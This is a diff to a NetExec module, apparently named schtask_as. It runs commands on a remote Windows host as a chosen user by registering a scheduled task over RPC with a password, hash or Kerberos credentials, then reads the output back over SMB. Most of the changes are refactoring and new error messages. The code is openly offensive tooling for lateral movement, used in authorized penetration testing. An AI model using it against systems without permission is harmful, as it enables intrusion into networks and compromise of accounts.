@@ -2,12 +2,13 @@
 # -*- coding: utf-8 -*-
 
 import os
-from impacket.dcerpc.v5 import tsch, transport
-from impacket.dcerpc.v5.dtypes import NULL
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-from nxc.helpers.misc import gen_random_string
 from time import sleep
 from datetime import datetime
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5 import tsch, transport
+from nxc.helpers.misc import gen_random_string
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
 
 class NXCModule:
     """
@@ -22,7 +23,6 @@ class NXCModule:
         """
 
         self.cmd = self.user = self.time = None
-
         if "CMD" in module_options:
             self.cmd = module_options["CMD"]
         
@@ -35,7 +35,6 @@ class NXCModule:
     opsec_safe = True
     multiple_hosts = False
     
-    
     def on_admin_login(self, context, connection):
         self.logger = context.log
         if self.cmd is None:
@@ -45,7 +44,6 @@ class NXCModule:
             self.logger.fail("You need to specify a USER to run the command as") 
             return 1
 
-        
         self.logger.display("Connecting to the remote Service control endpoint")
         try:
             exec_method = TSCH_EXEC(
@@ -65,17 +63,21 @@ class NXCModule:
                 "C$" # This one shouldn't be hardcoded but I don't know where to retrive the info
             )
 
+            self.logger.display(f"Executing {self.cmd} as {self.user}")
             output = exec_method.execute(self.cmd, True)
           
             try:
                 if not isinstance(output, str):
                     output = output.decode(connection.args.codec)
             except UnicodeDecodeError:
-                self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
+                # Required to decode specific french caracters otherwise it'll print b"<result>"
+                output = output.decode("cp437")
             self.logger.highlight(output)
 
         except Exception as e:
-            self.logger.fail(f"Error executing command via atexec, traceback: {e}")
+            if str(e).find("SCHED_S_TASK_HAS_NOT_RUN") > 0:
+                self.logger.fail(f"Task was not run, check the options")
+            
 
 class TSCH_EXEC:
     def __init__(self, target, share_name, username, password, domain, user, cmd, doKerberos=False, aesKey=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
@@ -99,7 +101,6 @@ class TSCH_EXEC:
         self.user = user
 
         if hashes is not None:
-            # This checks to see if we didn't provide the LM Hash
             if hashes.find(":") != -1:
                 self.__lmhash, self.__nthash = hashes.split(":")
             else:
@@ -179,7 +180,7 @@ class TSCH_EXEC:
       <Command>cmd.exe</Command>
 """
         if self.__retOutput:
-            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
+            self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(6)}" 
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
                 argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
@@ -189,9 +190,8 @@ class TSCH_EXEC:
         elif self.__retOutput is False:
             argument_xml = f"      <Arguments>/C {command}</Arguments>"
 
-        self.logger.debug("Generated argument XML: " + argument_xml)
+        self.logger.debug(f"Generated argument XML: {argument_xml}")
         xml += argument_xml
-
         xml += """
     </Exec>
   </Actions>
@@ -206,7 +206,6 @@ class TSCH_EXEC:
 
         dce.set_credentials(*self.__rpctransport.get_credentials())
         dce.connect()
-        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
         
         tmpName = gen_random_string(8)
 
@@ -221,10 +220,10 @@ class TSCH_EXEC:
             dce.bind(tsch.MSRPC_UUID_TSCHS)
             tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
         except Exception as e:
+            if str(e).find("ERROR_NONE_MAPPED") > 0 :
+                self.logger.fail(f"User {self.user} is not connected on the target, cannot run the task")
             if e.error_code and hex(e.error_code) == "0x80070005":
-                self.logger.fail("ATEXEC: Create schedule task got blocked.")
-            else:
-                self.logger.fail(str(e))
+                self.logger.fail("Schtask_as: Create schedule task got blocked.")
             return
         else:
             taskCreated = True
@@ -246,7 +245,7 @@ class TSCH_EXEC:
         taskCreated = False
 
         if taskCreated is True:
-            tsch.hSchRpcDelete(dce, "\\%s" % tmpName)
+            tsch.hSchRpcDelete(dce, f"\\{tmpName}")
 
         if self.__retOutput:
             if fileless:
@@ -258,7 +257,6 @@ class TSCH_EXEC:
                     except IOError:
                         sleep(2)
             else:
-                peer = ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                 smbConnection = self.__rpctransport.get_smb_connection()
                 tries = 1
                 while True:
@@ -268,10 +266,10 @@ class TSCH_EXEC:
                         break
                     except Exception as e:
                         if tries >= self.__tries:
-                            self.logger.fail(f"ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
+                            self.logger.fail(f"Schtask_as: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                             break
                         if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
-                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
+                            self.logger.fail(f"Schtask_as: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                             break
                         if str(e).find("SHARING") > 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
                             sleep(3)
